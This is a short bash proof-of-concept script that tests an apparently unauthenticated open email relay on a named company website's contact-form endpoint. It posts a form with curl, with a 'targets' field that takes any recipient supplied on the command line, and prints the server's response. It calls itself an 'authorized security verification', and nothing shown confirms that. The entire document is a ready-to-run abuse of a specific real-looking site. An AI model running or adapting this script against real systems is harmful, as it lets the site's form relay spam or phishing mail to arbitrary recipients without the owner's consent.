#!/bin/bash
# Independent verification of unauthenticated open email relay at POST /api/send
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
ENDPOINT='https://www.infinitycapital.bh/api/send'

run() {
  local label="$1"; shift
  local rcpt="$1"; shift
  echo "===== ${label} ====="
  curl -s -D "${label}.hdr" -o "${label}.body" -X POST "$ENDPOINT" \
    -H "User-Agent: $UA" \
    -F 'fname=Independent' -F 'lname=Verifier' -F 'areacode=0' -F 'tel=0000000' \
    -F 'cname=Security Verification' \
    -F 'subject=Partnership Inquiries' \
    -F 'msg=Automated authorized security verification of contact form mail relay. No action required.' \
    -F 'check=0' \
    -F "targets=${rcpt}"
  echo "--- headers ---"; cat "${label}.hdr"
  echo "--- body ---"; cat "${label}.body"; echo
}

"$@"
